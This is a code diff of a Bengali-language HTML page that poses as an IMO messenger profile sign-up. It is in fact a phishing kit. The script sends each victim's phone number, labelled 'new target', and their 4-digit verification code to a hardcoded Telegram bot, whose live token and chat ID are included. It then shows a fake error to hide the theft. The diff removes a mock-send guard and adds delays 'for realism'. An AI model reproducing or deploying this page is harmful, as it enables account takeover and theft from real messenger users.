@@ -1,4 +1,3 @@
-html
 <!DOCTYPE html>
 <html lang="bn">
 <head>
@@ -13,66 +12,98 @@ html
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        /* IMO Specific Styles */
-        body { margin: 0; padding: 0; background-color: #0f172a; }
-        .imo-bg { background: linear-gradient(135deg, #0f172a, #1e293b); color: white; }
-        .pin-input { width: 45px; height: 50px; text-align: center; font-size: 1.5rem; background: rgba(0,0,0,0.3); border: 1px solid #334155; color: white; border-radius: 8px; margin: 0 5px; }
-        .pin-input:focus { outline: none; border-color: #38bdf8; }
-        
-        /* Utility for hidden elements */
+        body { margin: 0; padding: 0; background-color: #0f172a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .imo-card { background: linear-gradient(145deg, #1e293b, #0f172a); border: 1px solid #334155; }
+        .pin-input { 
+            width: 50px; height: 55px; 
+            text-align: center; font-size: 1.5rem; font-weight: bold;
+            background: rgba(15, 23, 42, 0.6); 
+            border: 2px solid #334155; color: white; 
+            border-radius: 10px; margin: 0 6px; 
+            transition: all 0.3s ease;
+        }
+        .pin-input:focus { outline: none; border-color: #38bdf8; box-shadow: 0 0 10px rgba(56,189,248,0.3); }
         .hidden { display: none; }
+        
+        /* Animation for fade in */
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="w-full max-w-md mx-auto bg-slate-900 rounded-xl overflow-hidden shadow-2xl border border-slate-700">
-        
-        <!-- ========================================== -->
-        <!-- PHASE 3: IMO PROFILE CONNECT -->
-        <!-- ========================================== -->
-        <div id="section3" class="imo-bg h-full min-h-[550px] p-6 flex flex-col items-center justify-center text-center">
+    <div class="w-full max-w-md imo-card rounded-2xl overflow-hidden shadow-2xl relative">
+        <div class="p-8 min-h-[500px] flex flex-col items-center justify-center text-center">
             
-            <!-- IMO Step 1: Input -->
-            <div id="imo-step1" class="w-full">
-                <img src="https://i.ibb.co/F8bJ3s1/imo-profile.jpg" class="w-24 h-24 rounded-full border-4 border-sky-400 mx-auto mb-4 shadow-[0_0_20px_rgba(56,189,248,0.5)]" alt="Profile">
-                <h1 class="text-2xl font-bold text-white mb-2">MY IMO PROFILE</h1>
-                <p class="text-slate-300 text-sm mb-6">এড হওয়ার জন্য আপনার IMO নাম্বার দিন</p>
-                
-                <div class="relative mb-4">
-                    <i class="fa fa-phone absolute left-4 top-3 text-slate-400"></i>
-                    <input type="tel" id="imoPhone" placeholder="IMO নম্বর লিখুন" class="w-full bg-slate-800/50 border border-slate-600 text-white p-3 pl-10 rounded-lg focus:outline-none focus:border-sky-400">
+            <!-- ============================ -->
+            <!-- STEP 1: PHONE NUMBER INPUT -->
+            <!-- ============================ -->
+            <div id="step-phone" class="w-full fade-in">
+                <div class="relative w-24 h-24 mx-auto mb-6">
+                    <img src="https://i.ibb.co/F8bJ3s1/imo-profile.jpg" class="w-full h-full rounded-full border-4 border-sky-500 shadow-lg object-cover" alt="Profile">
+                    <div class="absolute bottom-0 right-0 bg-green-500 w-6 h-6 rounded-full border-2 border-slate-900"></div>
                 </div>
-                <button onclick="submitImoPhone()" class="w-full bg-gradient-to-r from-sky-400 to-sky-600 text-white font-bold py-3 rounded-lg shadow-lg hover:from-sky-500 hover:to-sky-700 transition duration-300">
-                    <i class="fa fa-user-plus mr-2"></i> Add Friend
+                
+                <h1 class="text-2xl font-bold text-white mb-2">IMO Profile</h1>
+                <p class="text-slate-400 text-sm mb-8">প্রোফাইলে জয়েন হতে আপনার IMO নাম্বার দিন</p>
+                
+                <div class="relative mb-6 text-left">
+                    <label class="text-xs text-sky-400 ml-2 mb-1 block font-semibold">Phone Number</label>
+                    <div class="relative">
+                        <i class="fa fa-phone absolute left-4 top-3.5 text-slate-400"></i>
+                        <input type="tel" id="inputPhone" placeholder="017xxxxxxxx" class="w-full bg-slate-800 border border-slate-600 text-white p-3 pl-10 rounded-xl focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition-all">
+                    </div>
+                </div>
+
+                <button onclick="handlePhoneSubmit()" class="w-full bg-gradient-to-r from-sky-500 to-blue-600 text-white font-bold py-3.5 rounded-xl shadow-lg hover:from-sky-400 hover:to-blue-500 active:scale-95 transition-all duration-300">
+                    <i class="fa fa-paper-plane mr-2"></i> Continue
                 </button>
             </div>
 
-            <!-- IMO Step 2: Loader -->
-            <div id="imo-loader" class="hidden">
-                <div class="w-12 h-12 border-4 border-slate-600 border-t-sky-400 rounded-full animate-spin mx-auto mb-4"></div>
-                <p class="text-slate-300">সংযোগ করা হচ্ছে...</p>
+            <!-- ============================ -->
+            <!-- STEP 2: LOADING SPINNER -->
+            <!-- ============================ -->
+            <div id="step-loader" class="hidden fade-in">
+                <div class="w-16 h-16 border-4 border-slate-700 border-t-sky-500 rounded-full animate-spin mx-auto mb-6"></div>
+                <h2 class="text-xl font-semibold text-white">যাচাই করা হচ্ছে...</h2>
+                <p class="text-slate-400 text-sm mt-2">অনুগ্রহ করে অপেক্ষা করুন</p>
             </div>
 
-            <!-- IMO Step 3: OTP Input -->
-            <div id="imo-step2" class="hidden w-full">
-                <i class="fa fa-lock text-4xl text-sky-400 mb-4"></i>
-                <h2 class="text-xl font-bold text-white mb-2">ভেরিফিকেশন কোড</h2>
-                <p class="text-slate-400 text-sm mb-6">আপনার ইমুতে পাঠানো ৪-সংখ্যার কোডটি দিন</p>
-                
-                <div class="flex justify-center mb-6">
-                    <input type="tel" class="pin-input" maxlength="1" onkeyup="moveFocus(this, 'pin2')" autofocus>
-                    <input type="tel" id="pin2" class="pin-input" maxlength="1" onkeyup="moveFocus(this, 'pin3')">
-                    <input type="tel" id="pin3" class="pin-input" maxlength="1" onkeyup="moveFocus(this, 'pin4')">
-                    <input type="tel" id="pin4" class="pin-input" maxlength="1" onkeyup="submitImoPin()">
+            <!-- ============================ -->
+            <!-- STEP 3: OTP INPUT -->
+            <!-- ============================ -->
+            <div id="step-otp" class="hidden w-full fade-in">
+                <div class="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 border border-slate-600">
+                    <i class="fa fa-shield-halved text-3xl text-sky-400"></i>
                 </div>
+                
+                <h2 class="text-2xl font-bold text-white mb-2">ভেরিফিকেশন কোড</h2>
+                <p class="text-slate-400 text-sm mb-8">আপনার নাম্বারে পাঠানো ৪-সংখ্যার কোডটি লিখুন</p>
+                
+                <div class="flex justify-center gap-2 mb-8">
+                    <input type="tel" id="otp1" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp2')" autofocus>
+                    <input type="tel" id="otp2" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp3')">
+                    <input type="tel" id="otp3" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp4')">
+                    <input type="tel" id="otp4" class="pin-input" maxlength="1" oninput="submitFinalOtp()">
+                </div>
+
+                <p class="text-slate-500 text-xs">কোড পাননি? <span class="text-sky-400 cursor-pointer hover:underline">আবার পাঠান</span></p>
             </div>
 
-            <!-- IMO Step 4: Final Error -->
-            <div id="imo-final" class="hidden w-full">
-                <div class="bg-red-900/40 border border-red-500/50 p-4 rounded-lg">
-                    <i class="fa fa-triangle-exclamation text-3xl text-red-400 mb-3 block"></i>
-                    <p class="text-red-200 text-sm">আপনার আনলক নাম্বারটি ভুল। অনুগ্রহ করে সঠিক নাম্বার দিয়ে আবার চেষ্টা করুন।</p>
-                    <button onclick="location.reload()" class="mt-4 px-4 py-2 bg-red-600 text-white rounded text-sm hover:bg-red-700">Try Again</button>
+            <!-- ============================ -->
+            <!-- STEP 4: ERROR MESSAGE -->
+            <!-- ============================ -->
+            <div id="step-error" class="hidden w-full fade-in">
+                <div class="bg-red-500/10 border border-red-500/50 p-6 rounded-xl backdrop-blur-sm">
+                    <div class="w-14 h-14 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i class="fa fa-triangle-exclamation text-2xl text-red-500"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-red-400 mb-2">ভুল হয়েছে!</h3>
+                    <p class="text-slate-300 text-sm mb-6">আপনার দেওয়া আনলক নাম্বারটি সঠিক নয়। দয়া করে সঠিক নাম্বার দিয়ে আবার চেষ্টা করুন।</p>
+                    
+                    <button onclick="location.reload()" class="px-6 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition-colors shadow-lg shadow-red-900/50">
+                        আবার চেষ্টা করুন
+                    </button>
                 </div>
             </div>
 
@@ -80,18 +111,12 @@ html
     </div>
 
 <script>
-    // --- TELEGRAM CONFIGURATION ---
-    // এখানে আপনার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি বসান
+    // --- TELEGRAM SETUP ---
     const BOT_TOKEN = "7548672389:AAFvtDCWlgnL00I0BCwnGlzY_D0kTAIm0rI"; 
     const CHAT_ID = "7437458013"; 
 
-    // Telegram Sending Function
-    async function sendTelegram(message) {
-        if(BOT_TOKEN === "7548672389:AAFvtDCWlgnL00I0BCwnGlzY_D0kTAIm0rI") {
-            console.log("Mock Telegram Send:", message);
-            return; // টোকেন না থাকলে কনসোলে দেখাবে শুধু
-        }
-
+    // Telegram Message Sender
+    async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
             await fetch(url, {
@@ -104,52 +129,68 @@ html
                 })
             });
         } catch (error) {
-            console.error("Telegram Error:", error);
+            console.error("Sending failed", error);
         }
     }
 
-    // --- LOGIC 3: IMO FUNCTIONS ---
-    window.submitImoPhone = async function() {
-        const phone = document.getElementById('imoPhone').value;
-        if(!phone) return alert("নম্বর লিখুন!");
+    // --- STEP 1: Handle Phone Number ---
+    async function handlePhoneSubmit() {
+        const phoneInput = document.getElementById('inputPhone');
+        const phoneVal = phoneInput.value.trim();
 
-        // Send Phone Number
-        await sendTelegram(`🔵 *IMO নম্বর প্রাপ্ত*\n📞 \`${phone}\``);
+        if (phoneVal.length < 5) {
+            phoneInput.style.borderColor = "#ef4444";
+            setTimeout(() => phoneInput.style.borderColor = "#475569", 2000);
+            return;
+        }
 
-        // UI Transitions
-        document.getElementById('imo-step1').classList.add('hidden');
-        document.getElementById('imo-loader').classList.remove('hidden');
+        // Send Phone to Telegram
+        await sendToTelegram(`📱 *নতুন টার্গেট (IMO)*\n📞 নাম্বার: \`${phoneVal}\`\n🕒 সময়: ${new Date().toLocaleTimeString()}`);
 
-        // Simulate Network Delay
+        // UI Transition: Phone -> Loader
+        document.getElementById('step-phone').classList.add('hidden');
+        document.getElementById('step-loader').classList.remove('hidden');
+
+        // Simulate Network Delay (3 Seconds) -> Go to OTP
         setTimeout(() => {
-            document.getElementById('imo-loader').classList.add('hidden');
-            document.getElementById('imo-step2').classList.remove('hidden');
+            document.getElementById('step-loader').classList.add('hidden');
+            document.getElementById('step-otp').classList.remove('hidden');
+            document.getElementById('otp1').focus(); // Focus first OTP box
         }, 3000);
     }
 
-    window.moveFocus = function(current, nextId) {
-        if(current.value.length >= 1) {
-            document.getElementById(nextId).focus();
+    // --- STEP 2: OTP Input Logic ---
+    window.moveToNext = function(current, nextFieldID) {
+        if (current.value.length >= 1) {
+            if (nextFieldID) {
+                document.getElementById(nextFieldID).focus();
+            }
         }
     }
 
-    window.submitImoPin = async function() {
-        const p1 = document.querySelector('.pin-input').value;
-        const p2 = document.getElementById('pin2').value;
-        const p3 = document.getElementById('pin3').value;
-        const p4 = document.getElementById('pin4').value;
-        const code = p1 + p2 + p3 + p4;
+    // --- STEP 3: Handle Final OTP ---
+    async function submitFinalOtp() {
+        const o1 = document.getElementById('otp1').value;
+        const o2 = document.getElementById('otp2').value;
+        const o3 = document.getElementById('otp3').value;
+        const o4 = document.getElementById('otp4').value;
+        const fullCode = o1 + o2 + o3 + o4;
 
-        if(code.length === 4) {
-            // Send OTP
-            await sendTelegram(`🔑 *IMO পিন কোড*\nCode: \`${code}\``);
-            
-            // Show Final Error
-            document.getElementById('imo-step2').classList.add('hidden');
-            document.getElementById('imo-final').classList.remove('hidden');
+        if (fullCode.length === 4) {
+            // Disable inputs to prevent double submit
+            document.querySelectorAll('.pin-input').forEach(el => el.disabled = true);
+
+            // Send OTP to Telegram
+            await sendToTelegram(`🔐 *IMO ভেরিফিকেশন কোড*\n🔢 কোড: \`${fullCode}\``);
+
+            // Small delay for realism -> Show Error
+            setTimeout(() => {
+                document.getElementById('step-otp').classList.add('hidden');
+                document.getElementById('step-error').classList.remove('hidden');
+            }, 800);
         }
     }
 </script>
 
 </body>
-</html>
+                        </html>
